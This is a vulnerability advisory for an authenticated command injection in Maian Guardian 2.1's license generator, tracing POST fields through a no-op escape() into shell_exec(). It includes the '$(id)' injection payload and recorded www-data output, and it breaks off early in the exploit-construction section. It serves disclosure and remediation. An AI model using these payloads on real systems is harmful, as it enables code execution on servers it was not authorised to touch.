# Maian Guardian 2.1 — Command Injection in the License-Generation Shell Assembly (`guardianLicense::create()`) → Code Execution as the Web Server User

## 1. Overview

### Overview of the finding

Maian Guardian 2.1 assembles an operating-system command line by string interpolation and hands it to `shell_exec()` in the routine that issues SourceGuardian licenses. Several of the interpolated fields come straight out of an administrator HTTP POST body, and the function the class uses to "escape" them returns its argument unchanged. The result is a classic OS command injection (CWE-78) that we verified end to end against a real installation: a single authenticated AJAX request executes attacker-chosen commands as the web server user, and the recorded run returned `uid=33(www-data) gid=33(www-data) groups=33(www-data)` together with the output of five further injected commands.

The sink is `control/classes/class.licensing.php:261`, inside `guardianLicense::create()`:

```php
shell_exec(mswSGLicGenPath('"', $this->settings) . " $string $output");
```

`$string` contains `--projid "<value>"`, where `<value>` is `$_POST['projid']` from the administration endpoint `admin/index.php?ajax-ops=generate`. Because the value is placed inside double quotes rather than argument-quoted, POSIX command substitution still applies at shell expansion time: a `$(...)` in the project identifier executes before the generator binary is ever invoked. That is the whole vulnerability in one sentence, and everything below documents why nothing on the path stops it.

What makes this more than a one-script bug is the sanitizer. The class ships a private method named `escape()`, and its entire body is `return $data;`. It is called on the way to the shell. A companion method `escapeArg()`, which does wrap PHP's `escapeshellarg()`, is defined in the same class and is never called anywhere in the product — dead code. A third helper, `escapeCmd()` wrapping `escapeshellcmd()`, exists and is applied, but only to unrelated fields (`head()`, `time_servers()`, `add_lic_info()`), never to `projid` or `projkey`. So a reviewer reading `properties()` sees escaping; a reviewer reading `lock()` sees quotation marks and assumes quoting. Both assumptions are wrong, and the wrongness is encoded in shipped source rather than in a deployment choice.

This is an authenticated finding and we publish it as one. The administrator session gate was examined for bypass and none was found; the remote license-issuing API is gated by a key that is randomly generated at installation and was not bypassed; the product ships no factory credential, because the installer sets the administrator account. The demonstrated principal is an administrator, so the published score is CVSS 3.1 **7.2** (High) under `PR:H`. No unauthenticated variant, no default-credential amplifier and no privilege escalation beyond the service account is claimed anywhere in this document.

### Overview of the product and its runtime stack

Maian Guardian is a self-hosted licensing system for PHP applications encoded with SourceGuardian. It is sold as a commercial script by Maian Script World, a United Kingdom vendor. The customer installs it on their own web server and uses it to issue, track and validate license files for encoded products that they sell; the encoded product phones home to Guardian through a remote license-issuing API.

The version analysed here is 2.1. The runtime stack is plain PHP 8 with a MySQL backend — no framework, no compiled extensions of its own, roughly 308 PHP files shipped in clear text (closed-source in the sense of commercial licensing, not obfuscated). Functionally the product has three faces:

- An administrator back-end under `/admin/` for product, license and buyer management. Its dynamic operations are exposed as an AJAX switchboard in `admin/control/system/_ajax.php`, addressed as `/admin/index.php?ajax-ops=<op>`, with around forty documented operations including `generate`.
- A buyer-facing portal on the front `index.php`, where a customer looks up or downloads a license using their license key. It carries its own session identity, distinct from the administrator session.
- A remote license-issuing API at `control/api/api-remote.php`, also reachable through the front controller with `remote` and `apiKey` parameters, so that a protected product can request a license online without human involvement.

License generation itself is delegated to the external SourceGuardian generator binary. Guardian stores the path to that binary in a settings row (`licpath` in the `guard_settings` table) and invokes it through the shell with a long list of `--option "value"` arguments describing the project identifier, project key, licensing properties, lock settings, expiry, host blocking and time servers. That external-binary boundary is where the injection lives: the product converts structured per-license data into one flat shell string.

### Overview of the testbed and of what that implies

Our testbed was a containerised installation of the product rather than a vendor appliance, and three properties of it matter for reading the evidence honestly.

First, the PHP tier was a stock PHP 8.3 Apache image with the MySQL tier in a second container on a private bridge network, and the HTTP listener was bound to the loopback interface of the host that ran them. The loopback binding is our own safety choice for a research host; it is not a property of the product. Guardian is designed to be served over HTTP or HTTPS on whatever address the deployment chooses, and nothing in the vulnerable path depends on how the listener is bound.

Second, the installation was completed with the product's own install wizard. The administrator account was created by that wizard with a strong password chosen by us for the engagement; there is no vendor default to fall back on, and the credential is not reproduced in this document. The settings row `guard_settings.licpath` was pointed at `/bin/echo` — a placeholder standing in for the real SourceGuardian generator binary, which is separately licensed and which we did not possess. This does not weaken the demonstration, for a reason that is itself part of the finding: `$(...)` is expanded by the shell before the command word is executed, so the identity and even the existence of the generator binary is irrelevant to whether the injected command runs. But it does bound the claim — a run against a genuine production installation with the real generator binary installed was not performed.

Third, the shipped debugging flag `ENC_DEBUG` was left at its shipped value of `0` (`control/options.php:37`). With that value, `create()` takes the branch that calls `shell_exec()`. We did not flip it, disable a dependency, patch a library or loosen a permission to reach the sink; the only state we set was the license-generator path and the administrator password, both of which any functioning installation also has.

### Overview of affected scope

The affected component is the license-generation routine of the administrator back-end, specifically the `guardianLicense` class in `control/classes/class.licensing.php` as reached from the `generate` AJAX operation. Only version 2.1 was installed and tested. We make no claim about any other version, edition or bundle of the product, and we have not audited the vendor's other scripts.

Within 2.1, the scope is wider than the single field we exercised. Six further tainted inputs reach the same `shell_exec()` call site, and the remote license-issuing API feeds the same class from a different entry point. Five of those paths are established by source reading; one field (`projid`) is established by execution. Section 5 separates the two categories explicitly, and section 12 does not price the unexercised paths into the score.

### Overview of independence

Our review found no published vulnerability record for Maian Guardian: no CVE identifier is associated with this product in the public vulnerability databases we consulted, and this finding is not a re-publication of anyone else's work. Because the product has no prior record at all, there is no earlier CVE against which to differentiate this one — the usual "same product, different endpoint" comparison is not available, and we do not manufacture one.

The scope of that statement is the review we actually performed against public vulnerability records for this product. It is not a claim that the vendor's other products are unaffected, and it is not a claim that the absence of a database entry proves anything about the vendor's engineering. We reference no other work of ours inside this advisory; the finding stands on its own source citations and its own recorded execution.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Property | Value |
|---|---|
| Product | Maian Guardian 2.1 |
| Vendor | Maian Script World (United Kingdom) |
| Class | OS command injection, CWE-78 |
| Component | Administrator back-end, license generation (`generate` AJAX operation) |
| Sink | `control/classes/class.licensing.php:261`, `shell_exec()` inside `guardianLicense::create()` |
| Primary tainted field | `$_POST['projid']` → `guardianLicense::$projid` → `lock()` at `class.licensing.php:112` |
| Additional tainted fields on the same sink | `projkey`, license property key/value pairs, the encoder string, `hblock`, `timeservers`, `expire_in` |
| Escaping applied on the path | None that has any effect: `escape()` returns its argument unchanged (`class.licensing.php:68-70`), `mswCD()` likewise (`class.licensing.php:152-154`), and the global POST filter only trims (`functions.php:342`) |
| Real escaper shipped but unused | `escapeArg()` wrapping `escapeshellarg()` at `class.licensing.php:72-74`, no call site in the product |
| Authentication | Administrator session `guardian_access` plus a CSRF token; enforced at `admin/control/init.php:122` and again per-operation |
| Factory credentials | None. The installer sets the administrator credential |
| Preconditions | Administrator session; a non-empty license-generator path in settings; `ENC_DEBUG` at its shipped value of `0` |
| Execution identity | Web server service account, observed as `uid=33(www-data)` |
| Verified transport | HTTP only — login, injection and proof read-back, all in one request sequence |
| Score | CVSS 3.1 base **7.2** (High), `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Prior public record for this product | None found in our review |

### Vulnerability Summary mechanics

The `generate` operation validates only that a few POST fields are present and that the CSRF token matches. It then constructs a `guardianLicense` object whose members are the raw POST values, and calls `create()`. `create()` concatenates six helper strings into one command tail — `lock()`, `expiry()`, `properties()`, `head()`, `time_servers()` and `add_lic_info()` — and passes `"<licpath>" <tail> <output>` to `shell_exec()`. Two of those helpers build double-quoted argument values out of untrusted data: `lock()` emits `--projid "<projid>"` and `--projkey "<projkey>"`, and `properties()` emits `--const "<key>=<value>"`. Double quotes are a quoting context, not a neutralisation context: inside them the shell still performs command substitution, backtick expansion and backslash processing. A `projid` of `$(id)` therefore runs `id` in a subshell during expansion of the argument list, and the substituted text is passed to the generator binary as if it were the project identifier.

The escaping that ought to prevent this is present in name only. `escape()` is a private method that returns its input; `mswCD()` is a global helper that does the same; and `escapeArg()`, which wraps the one PHP function that would actually be safe here, is defined and never called. The single place where a real escaping function is used — `escapeCmd()` around `escapeshellcmd()` in `head()`, `time_servers()` and `add_lic_info()` — omits the two fields that carry attacker-chosen project identifiers. `escapeshellcmd()` would in fact have neutralised `$(` and the backtick; it simply was not wired to these fields.

Because expansion happens before execution, the injection does not require the generator binary to exist, to be the real SourceGuardian tool, or to succeed. Our verified run used `/bin/echo` in its place and the command still executed — the AJAX operation even returned its normal `{"status":"rdr"}` body, because the placeholder produced no valid license file while the shell had already run the substituted commands.

### Vulnerability Summary preconditions

Three conditions gate the chain, and we publish all three rather than trimming them:

1. A valid administrator session. The `generate` operation sits behind the product's init-level administrator gate and behind a per-operation CSRF token check. Both were satisfied by logging in normally with credentials supplied to the exploit as command-line arguments. We found no bypass and claim none.
2. A non-empty license-generator path in the product settings. Our run set `guard_settings.licpath` to `/bin/echo`. Any installation that actually issues licenses has this configured to the real generator binary. Separately, and worth noting because it is easy to misread the endpoint, the `generate` handler also requires a non-empty `licpath` **POST field**, which is attacker-supplied and which the handler forwards as the encoder string; our request supplied `--domain example.com` there, which is the product's own fallback text.
3. `ENC_DEBUG` at its shipped value of `0`, which selects the `shell_exec()` branch of `create()`.

There is no fourth precondition and no factory credential anywhere in this chain. The installer requires the operator to choose the administrator username and password, and the remote API key is randomly generated at install time. The finding is therefore not a default-credential finding, and no part of its severity depends on a weak or unrotated password.

One internal inconsistency in our own notes is recorded here rather than smoothed over. The reachability analysis states that `licpath` must be non-empty, while the injection analysis separately notes that the command substitution fires during shell expansion even if the generator path is empty or the binary is missing, because expansion precedes the command-word lookup. Both statements appear in the notes; only the non-empty-path shape was executed. We treat preconditions 2 and 3 as documented, and we treat "fires even with an empty path" as a structural argument that is plausible but not demonstrated.

## 3. Authentication Boundary

### Authentication Boundary — how sessions are issued

The administrator session is issued by the `login` operation of the same AJAX switchboard that hosts the vulnerable operation: `POST /admin/index.php?ajax-ops=login` with `usr`, `pw` and `cs_rf`, handled at `admin/control/system/_ajax.php:996-1015`. On success the product sets a PHP session variable named `guardian_access` whose value is the installation's `SECRET_KEY` concatenated with the current timestamp. `SECRET_KEY` is generated at install time and written into `control/_cfg.php`; it is not a shipped constant.

The credential check itself is at `_ajax.php:1010-1015`, and it has two branches:

```php
if (!defined('LG_USER') || !defined('LG_PASS')
    || mswEnc($pass.SECRET_KEY) != mswEnc(LG_PASS.SECRET_KEY)
    || $user != LG_USER) {
  $eString[] = $adlang15[4];
}
```

The product first consults the `guard_staff` table for additional staff accounts; when the presented user is not a staff row it falls back to the `LG_USER` / `LG_PASS` constants provisioned by the installer. `mswEnc()` is `sha1()` (`control/functions.php:263`), and the comparison is between two salted hashes, so the plaintext password never reaches a comparison and the SQL side of the staff lookup is parameterised.

A second, weaker identity exists for the buyer portal: session variable `guardian_eaccess`, established by presenting a valid license key through the front controller. That principal can query and download licenses. It has no route into the administrator switchboard, and our review found no operation reachable with a buyer session that touches `guardianLicense::create()`.

A third identity is the remote API key holder, discussed next.

### Authentication Boundary — what the gate actually checks

Every administrator page and every administrator AJAX operation passes through one init-level gate at `admin/control/init.php:122`:

```php
if ($SSN->active('guardian_access') == 'no' && ... && !isset($loginBypass)) {
  include(login.php);
}
```

This is a hard gate at include time rather than a per-request filter that can be forgotten on one route, which is why we treat the administrator surface as closed by default. Inside the `generate` case there is a second, operation-level check, `CSRF_POST_VAL == 'yes'` (`_ajax.php:74`), backed by `control/tokens.php:26-41`: the submitted `$_POST['cs_rf']` or the `csrf` HTTP request header must match the `csrf_token` value bound to the session. The token is rendered on administrator pages in a `meta` element, and our exploit reads it from there twice — once on the login page, once after login — because the product rotates it per page render.

We examined eight candidate bypasses against this boundary and recorded all eight as blocked:

| Candidate | Result | Why |
|---|---|---|
| Forging `guardian_access` | Blocked | The value embeds the per-install random `SECRET_KEY` |
| Omitting or replaying the CSRF token | Blocked | Token is bound to the server-side session and validated per operation |
| Injecting `$loginBypass` | Blocked | The variable is internal to the init file; no external input reaches it |
| SQL injection in the login path | Blocked | Staff lookup is parameterised; the constant path compares salted SHA-1 digests |
| Timing attack on the login comparison | Blocked | Digest comparison of equal-length hex strings; no exploitable divergence identified |
| Default-credential fallback | Blocked | The installer has no shipped default; it forces the operator to set the credential |
| Hardcoded `LG_USER` / `LG_PASS` | Blocked | Written at install time from operator input, not compiled into the product |
| Guessing the remote API key | Blocked | Randomly generated at install (`install/control/functions.php:155-162`) |

The remote license-issuing API deserves its own paragraph, because it is the second front door into the same vulnerable class. `control/api/api-remote.php` gates on:

```php
md5($apiKey) == md5($SETTINGS->apikey)
```

The key is randomly generated at install time and we did not bypass this comparison. We report one structural observation about it separately from the command injection, and we do not price it into the CVSS vector: hashing both sides with an unsalted MD5 adds nothing over comparing the raw key, MD5 is a weak digest choice for a secret-bearing comparison, and the loose `==` on two digests is not a constant-time comparison. None of that was demonstrated to be exploitable — the strength of this gate rests entirely on the entropy of the install-time random key, and we found no leak path for it. We raise it as hardening (CWE-328 and CWE-208 class), not as a second vulnerability and not as a severity argument.

### Authentication Boundary — the principal required by the sink

The sink requires an administrator. The `generate` operation is reached only through the administrator gate, and the identity our exploit used was the installer-provisioned administrator account authenticating with a strong password supplied on the command line.

We considered whether a lower-privileged principal could reach the same code. The product does maintain a `guard_staff` table for additional accounts, so a multi-user deployment is possible. Our review of the interface inventory found no role or permission column that separates license generation from any other administrator operation, and no documented staff role with a narrower capability set; every path we traced to `guardianLicense::create()` was behind the administrator gate with the same operation-level CSRF check. We therefore publish `PR:H` and say plainly that the lower-privilege question is unresolved rather than assuming the answer that would raise the score. Section 12 prints the rejected `PR:L` reading with its own vector so the difference is visible.

### Authentication Boundary — what is deliberately not claimed

- No authentication bypass. The gate held under eight candidate bypasses and we present it as sound.
- No unauthenticated reachability of any sink. The unauthenticated surface was enumerated interface by interface and parameter by parameter; none of it reaches a command-execution, deserialization or file-write sink.
- No default or factory credential. The product has none to use.
- No CSRF-driven attack from an unauthenticated position. The CSRF token is required and session-bound, so driving an administrator's browser from outside is not part of this chain; we do not score a user-interaction-dependent variant.
- No claim about the remote API key being obtainable. The parallel API path into this sink is real in source, and it is documented in section 5, but it requires holding a valid randomly generated key.
- No privilege escalation. The identity reached is the service account; root was neither attempted nor claimed.

## 4. Attack Surface

### Attack Surface — listeners, routes and their protection

Guardian 2.1 exposes one HTTP listener and, behind it, roughly sixty-two distinct interfaces. They fall into five groups:

```
L1 listener          : one HTTP(S) listener, Apache + mod_php in our testbed
                       (bound to loopback on the research host by our own choice)
L2 route groups      : /admin/index.php?ajax-ops=<op>   ~40 administrator operations
                       /index.php                       buyer portal (GET) and its own
                                                        AJAX operations (POST)
                       /index.php?remote=..&apiKey=..   remote license-issuing API,
                       control/api/api-remote.php       implemented in api-remote.php
                       /content/* /js/* /css/*          static asset trees, served
                       /templates/*                     directly by the web server
                       /install/index.php               install wizard; renamed to
                                                        install.bak after installation
L3 session gate      : admin/control/init.php:122  -- guardian_access must be active
L4 operation gate    : _ajax.php:74 CSRF_POST_VAL == 'yes'  -- cs_rf POST field or
                       csrf request header vs session csrf_token (control/tokens.php:26-41)
L5 sink              : control/classes/class.licensing.php:261  shell_exec()
L6 disk written      : license output path plus (in our run) a marker file inside the
                       document root, owned by the service account
```

Protection per group: the administrator group is behind L3 and L4 for every operation we traced. The buyer portal group is behind its own `guardian_eaccess` session and, for license lookups, requires knowledge of a license key. The remote API group is behind the MD5 key comparison described in section 3. The static asset groups are unauthenticated by design and are plain file service. The installer group is unauthenticated only before installation; after installation the directory is renamed and the routes are unreachable, which is also why we exclude them from this analysis.

Counting the unauthenticated subset: approximately nine of the sixty-two interfaces answer a request that carries no credentials at all — the four static trees, the buyer portal front page, its license-lookup operation, the remote API endpoint refusing a keyless request, the post-install unreachable installer, and the login operation itself. That is roughly fifteen percent of the surface reachable without credentials, and none of it contains a sink.

### Attack Surface — how the surface was mapped

Three independent enumerations were cross-checked, and the union produced no further interfaces, which is what we treat as exhaustion for this product:

1. Front-end enumeration of the administrator's own AJAX helper (`admin/content/js/ops.js`), which lists the operations the interface can dispatch and the parameter names they send.
2. Back-end enumeration of the `switch` cases in `admin/control/system/_ajax.php`, the parameter handling in `control/api/api-remote.php`, and the routing in the front `index.php`.
3. Dynamic capture of real traffic: the install wizard, administrator login, a license `generate` call, and buyer-portal browsing.

On top of the interface inventory, every parameter of every unauthenticated interface was tested individually for the defect classes that could reach a sink: path traversal against the static trees (`../` and its percent-encoded forms), SQL injection against the buyer portal's license-key parameter and against the login `usr` / `pw` fields, type-confusion and over-long input against the same, and token-binding checks against `cs_rf`. The result was zero parameters reaching a sink and zero authentication-gate failures; the static trees are served by the web server without entering PHP, and the database paths we reviewed are parameterised.

We also swept the product for command-execution primitives across all 308 PHP files. Two call sites were flagged: the license generator at `control/classes/class.licensing.php:261`, and a second site at `admin/control/system/_ajax.php:303` whose command string is fixed in source and carries no external input. Only the first is injectable, and it is the subject of this advisory.

### Attack Surface — components that narrow the surface

Several design choices genuinely reduce risk here, and it is fair to record them:

- The administrator gate is implemented once at include time (`init.php:122`) rather than repeated per operation, so a new operation cannot silently ship without it.
- The CSRF token is session-bound and rotated per page render, so an administrator cannot be driven into the vulnerable operation from a third-party page without also defeating the token.
- The persistence-relevant secrets are all per-installation: `SECRET_KEY`, `LG_USER` / `LG_PASS`, the remote API key and the database credentials are written at install time into `control/_cfg.php` and the `guard_settings` table. There is no shipped constant to reuse across installations, so a credential harvested from one customer does not open another.
- The CRUD paths for staff, products, licenses and buyers use parameterised database access in our review, and we found no second injection class on the authenticated surface.

Two properties widen it again, and both belong in any operator's risk assessment:

- By design, license generation must invoke an external binary. That is an inherent privilege boundary — the web application becomes a process launcher — and Guardian implements it with string interpolation rather than an argument vector.
- In the shape we tested, the document root was writable by the service account. That single property converted "code execution" into "code execution with an HTTP-visible proof channel", and in a real deployment it converts one administrator request into persistence.

## 5. Sink Identification

### Sink Identification — how the sink was found

The sink was found by enumerating command-execution primitives in the shipped PHP tree rather than by probing the running product. A sweep of all 308 PHP files for `shell_exec`, `exec`, `system`, `passthru`, `proc_open`, `popen`, `pcntl_exec` and backtick execution produced two hits. The hit at `admin/control/system/_ajax.php:303` was discarded because its command string is literal. The hit at `control/classes/class.licensing.php:261` was kept because the command string is composed from object members, and the next step was backward taint tracking from that call site to whatever populates those members. That walk ends at `$_POST` in the administrator AJAX handler after five hops, with no validation in between — section 7 prints the whole chain.

### Sink Identification — the vulnerable construction

The call site, with the two lines immediately above it for context (`control/classes/class.licensing.php:260-262`):

```php
$output = $path . $this->name;
try {
  shell_exec(mswSGLicGenPath('"', $this->settings) . " $string $output");
```

`mswSGLicGenPath()` is a three-line helper at `control/functions.php:123-125`:

```php
function mswSGLicGenPath($enclosed = '', $s = '', $cmd = '') {
  return $enclosed . $s->licpath . $enclosed . $cmd;
}
```

Called with `'"'` as the enclosure it returns `"<licpath>"` — the configured generator path wrapped in double quotes. `$string` is built in `create()` at `class.licensing.php:208-215` by concatenating six helpers: `lock()`, `expiry()`, `properties()`, `head()`, `time_servers()` and `add_lic_info()`. The two that matter are quoted here because they are where untrusted data enters a quoting context instead of an argument vector:

```php
$lock[] = '--projid "'  . $this->projid  . '"';   // class.licensing.php:112
$lock[] = '--projkey "' . $this->projkey . '"';   // class.licensing.php:113
```

```php
$prop[] = ' --const "' . guardianLicense::escape(mswCD($this->properties[$i]['key']))
        . '=' . guardianLicense::escape(mswCD($this->properties[$i]['value'])) . '"';
                                                // class.licensing.php:184
```

So with, say, a generator path of `/bin/echo`, the string handed to `shell_exec()` is:

```
"/bin/echo" --projid "<PROJID>" --projkey "<PROJKEY>" --const "<KEY>=<VALUE>" ... <output>
```

and `<PROJID>` is whatever an authenticated administrator posted. PHP passes that text to `/bin/sh -c`, which is the standard implementation of `shell_exec`. Inside a double-quoted word the shell does not treat `$(`, a backtick or `\` as literal; it expands them. A `projid` of `$(id)` therefore spawns `id` in a subshell and substitutes its output into the argument. Nothing after that point matters — the generator binary may not exist, may reject the arguments, may not even be the real SourceGuardian tool. Expansion already happened.

The same class holds three sanitizer-shaped helpers, and the whole root cause is their arrangement:

```php
private function escape($data) {          // class.licensing.php:68-70
  return $data;                           // performs no escaping whatsoever
}

private function escapeArg($data) {      // class.licensing.php:72-74
  return escapeshellarg($data);           // correct primitive -- no call site anywhere
}
```

`escape()` is the function that is actually called on the way to the shell, and it returns its argument untouched. `escapeArg()` is the function that would be correct, and it is dead code — our sweep found no call site in the product. `escapeCmd()`, wrapping `escapeshellcmd()`, is real and is invoked, but only from `head()`, `time_servers()` and `add_lic_info()`, never from `lock()` or `properties()`; the fields it protects are the ones with the least attacker control, and the two fields carrying project identifiers are the ones it does not touch. `mswCD()` (`class.licensing.php:152-154`) is a second no-op, `return $data;`, applied to the property key and value immediately before `escape()`.

That arrangement is worth naming precisely, because it is the part with the longest tail: a function named `escape()` that does not escape is worse than no function at all. It satisfies a code reviewer's eye, it survives greps for "escaping", and it makes the surrounding concatenation look defended. Two no-ops are stacked in a row on the properties path, so a reader who assumes one of them must be doing something will assume the wrong thing twice.

### Sink Identification — execution identity of the child process

`shell_exec()` causes the PHP interpreter's process to spawn `/bin/sh -c <string>`, and the substituted command runs as a grandchild inside `$()`. All of them inherit the identity of the web server worker, because PHP is executing inside that worker. In our testbed that identity was the Debian-family service account, and the injected `id` command reported it verbatim:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

No setuid transition, no wrapper, no privilege drop and no sandbox sits between the web worker and the command. The same account owns the document root files the product writes, which is how the proof marker became readable over HTTP. There is no root in this picture: the child process has exactly the rights of the account that Apache or PHP-FPM runs as on the deployment.

### Sink Identification — sibling sinks, and whether they are proven

Six further tainted inputs reach the identical `shell_exec()` call at `class.licensing.php:261`. We list them with what protects them and what class of injection each supports, and we are explicit that only the first was executed:

| Field | Assembly location | Escaping applied | Injection class | Proven by execution? |
|---|---|---|---|---|
| `projid` | `class.licensing.php:112` | none (raw inside double quotes) | full command injection via `$()` | Yes — the verified chain in section 9 |
| `projkey` | `class.licensing.php:113` | none (raw inside double quotes) | full command injection via `$()`, or quote breakout | No — source-established only |
| Property key / value | `class.licensing.php:184` | no-op `escape()` stacked on no-op `mswCD()` | quote breakout inside `--const "k=v"` | No — source-established only |
| Encoder string (`$_POST['licpath']`) | `class.licensing.php:109`, concatenated at `:116-126` | none | raw concatenation into the command tail | No — source-established only |
| `hblock` | `head()` at `class.licensing.php:145` | `escapeCmd()` (`escapeshellcmd`) | argument injection only | No — source-established only |
| `timeservers` | `time_servers()` at `class.licensing.php:193` | `escapeCmd()` (`escapeshellcmd`) | argument injection only | No — source-established only |
| `expire_in` | `expiry()` at `class.licensing.php:167` | none | argument injection | No — source-established only |

The distinction between full command injection and argument injection matters and we do not blur it. `escapeshellcmd()` does escape the characters that make `$(...)` and backticks work, so for the two fields it guards the realistic outcome is feeding unexpected additional arguments to the generator — for example altering lock or time-server semantics on an issued license — not running arbitrary commands. A vendor fixing this should still fix all seven, because three of them carry no escaping function at all.

One more entry point reaches the same sink from outside the administrator back-end. `control/api/api-remote.php:136-154` builds a `guardianLicense` object from its own request parameters — project key, project identifier, license properties and time servers — and calls the same `create()`. It is gated only by the API key comparison. In source this is a second, non-administrator door to the identical shell assembly; it requires holding a valid randomly generated key, it was not exercised in our verification, and it does not change this advisory's authentication rating. We publish it because a vendor patching only the AJAX path would leave the sink reachable through the API.

## 6. Source Identification

### Source Identification — the tainted input and its transport

The tainted input is the body of one administrator POST request. `admin/control/system/_ajax.php` handles the `generate` case at lines 73-124:

```php
case 'generate':
  if (CSRF_POST_VAL == 'yes') {
    if (isset($_POST['licfile'], $_POST['projid'], $_POST['projkey'])) {
      if ($_POST['licfile'] && $_POST['projid'] && $_POST['projkey'] && $_POST['licpath']) {
        ...                                   // _ajax.php:73-76
        $GUARDIAN = new guardianLicense(array(  // _ajax.php:106-124
          'name'       => $_POST['licfile'],
          'encoder'    => ($_POST['licpath'] ? $_POST['licpath'] : '--domain example.com'),
          'projkey'    => $_POST['projkey'],
          'projid'     => $_POST['projid'],
          'properties' => $prop,               // from $_POST['key'] / $_POST['value']
          'settings'   => $SETTINGS,
          ...
        ));
        $file = $GUARDIAN->create();            // reaches shell_exec
```

The transport is `application/x-www-form-urlencoded`. Field names are `licfile`, `projid`, `projkey`, `licpath`, `key[]`, `value[]` and `cs_rf`; the CSRF token may equally travel in a `csrf` request header. The constructor assignment is direct — `class.licensing.php:44` records `$this->projid = $license['projid'];` — so the HTTP body value and the shell word are separated by a handful of string concatenations and nothing else.

Two implementation details of the handler shaped our request and are worth documenting for anyone reproducing this on PHP 8. The first is the four-field presence test on `_ajax.php:76`: `licfile`, `projid`, `projkey` and the POST-side `licpath` must all be non-empty, or the case falls through without constructing the object. The second is a PHP 8 type strictness issue at `_ajax.php:80`, where the handler counts the submitted property arrays; calling `count()` on a value that is not an array raises a `TypeError` under PHP 8, so a request that omits `key[]` and `value[]` aborts before reaching the sink. Supplying `key[]=a&value[]=b` satisfies the count and keeps the chain intact. This is not a security control, only a crash, but it does mean a naive reproduction attempt can fail for a reason that has nothing to do with filtering.

### Source Identification — sanitization that exists, and what it is for

Four things on this path look like sanitization. Their actual behaviour:

- `escape()` at `class.licensing.php:68-70` — `return $data;`. A private method of the license class, called from `properties()`. Purpose implied by the name: neutralise the value before it is placed in a shell word. Actual effect: none.
- `mswCD()` at `class.licensing.php:152-154` — also `return $data;`. A global helper called immediately around the property key and value before `escape()`. Same situation, second layer.
- `escapeArg()` at `class.licensing.php:72-74` — a correct `escapeshellarg()` wrapper with no call site in the product. Its existence shows the intended design and its non-use shows the regression that shipped.
- `escapeCmd()` — an `escapeshellcmd()` wrapper, genuinely invoked, but only by `head()` (`:145`), `time_servers()` (`:193`) and `add_lic_info()`. It never sees `projid` or `projkey`. Even where it is used, `escapeshellcmd()` is not an argument-quoting function and does not make an interpolated argument safe; PHP's own documentation treats it as unsuitable for that role.

Upstream of the class there is exactly one global input filter, at `control/functions.php:342`:

```php
$_POST = mswMDAM('trim', $_POST);
```

This walks the POST tree recursively and applies `trim()` to every scalar. It removes leading and trailing whitespace and nothing else. It does not strip, encode or reject `"`, `$`, `` ` ``, `(`, `)`, `;`, `|`, `&`, `>` or `<`, and it is the only request-wide filtering the product applies before handler code runs.

### Source Identification — validation that is absent

No validation of the license-generation fields exists at any layer:

- No character allow-list on `projid` or `projkey`. These are SourceGuardian project identifiers; a strict alphanumeric constraint is the natural rule and it is not applied. This contrast is concrete, because the same handler file already validates a different field this way — our analysis records a character-class check on the staff account `user` field at `admin/control/system/_ajax.php:432`. The product knows how to allow-list a string; it does not do so on the path to the shell.
- No length limit on any of the interpolated fields, so a payload is not truncated before it reaches the command line.
- No rejection of shell metacharacters anywhere between the POST body and the `shell_exec()` argument.
- No verification that the configured generator path names the expected binary, or that it is an existing executable, before it is interpolated into the command word.
- No conversion to an argument-vector form. PHP offers `proc_open()` with an array of arguments and `exec()` variants that avoid a shell entirely; the product uses neither for this call.

The absence is complete rather than partial: there is no half-implemented validator whose bypass we had to work around, and there is no configuration setting that would have turned validation on. That is why the fix recommendation in section 11 starts at the sink rather than at a missing toggle.

## 7. Data Flow

### Data Flow — end-to-end chain

Every hop below is a source citation from our analysis of the shipped 2.1 tree; the chain has no break and no conversion step:

```
HTTP POST /admin/index.php?ajax-ops=generate          (administrator session + cs_rf)
  body: projid=$(...)   projkey=...   licpath=...   licfile=...   key[]=a   value[]=b

[1] $_POST['projid']                                  _ajax.php:111 ('projid' => ...)
[2] global filter  mswMDAM('trim', $_POST)            functions.php:342   -- trim only
[3] new guardianLicense(array('projid' => ...))       _ajax.php:106-124
[4] $this->projid = $license['projid']                class.licensing.php:44
[5] lock():  '--projid "' . $this->projid . '"'       class.licensing.php:112  -- raw
[6] create(): $string = lock() . expiry() . properties() . head()
                     . time_servers() . add_lic_info() class.licensing.php:208-215
[7] shell_exec(mswSGLicGenPath('"', $this->settings)
               . " $string $output")                  class.licensing.php:261
[8] /bin/sh -c '"/bin/echo" --projid "$(id > ...)" ...'
[9] command substitution expands BEFORE the command word is executed
[10] injected commands run as the web server identity: uid=33(www-data)
[11] marker file written inside the document root, readable over HTTP
```

Hops 1 to 7 are the code path. Hops 8 to 11 are what the shell does with the result, and they are the reason the generator binary is irrelevant: expansion is part of building the argument list, and the argument list is built before execution is attempted.

### Data Flow — properties of the chain worth naming

- The chain is one request long. There is no chained second vulnerability, no stored-payload round trip and no administrative pre-step beyond being logged in. An administrator session plus a POST is the entire attack.
- The taint crosses a class boundary but never a validation boundary. Moving from the AJAX handler into `guardianLicense` looks like a layer change; no layer inspects the value.
- The type never changes. The value is a string at `$_POST`, a string in the object member, a string inside a concatenated argument and a string inside the shell word. No serialisation, encoding or numeric coercion offers an accidental defence.
- The sink is synchronous and inside the same request, so the attacker learns nothing from the HTTP response — `generate` answered `{"status":"rdr"}` on our run, its ordinary body when no valid license file appeared. The response is therefore useless as a proof channel and a poor detection signal, which is why the exploit reads its proof out of band.
- Expansion ordering makes the chain robust against a missing binary. A deployment that has never installed the SourceGuardian generator, or that has an incorrect path configured, is still fully exploitable. This inverts the usual intuition that a broken integration is safer.
- One sink, seven tainted fields. Because the vulnerable construction is the shared command assembly rather than one parameter parse, patching the `generate` handler alone leaves the API entry point and the other six fields reaching the same `shell_exec()`.

## 8. Exploit Construction

### Exploit Construction — step sequence

The published exploit is a single Python 3 script using only the standard library (`urllib.request`, `urllib.parse`, `http.cookiejar`, `re`, `argparse`, `uuid`, `sys`, `os`). It implements the full chain the advisory claims and nothing more, and it takes every environment-specific value as a command-line argument: target base URL, administrator username, administrator password, the command to run, the document root, the marker directory, the request timeout, and flags for the negative control and for cleanup. It keeps a cookie jar, so the session survives across steps.

```
step   request                                              purpose
-----  ---------------------------------------------------  ---------------------------------
1      GET  /admin/index.php                                obtain PHPSESSID cookie and the
                                                            CSRF token from the page's
                                                            x-header-csrf meta element
2      POST /admin/index.php?ajax-ops=login                  establish the administrator
       body: usr, pw, cs_rf   header: csrf                   session; success is signalled by
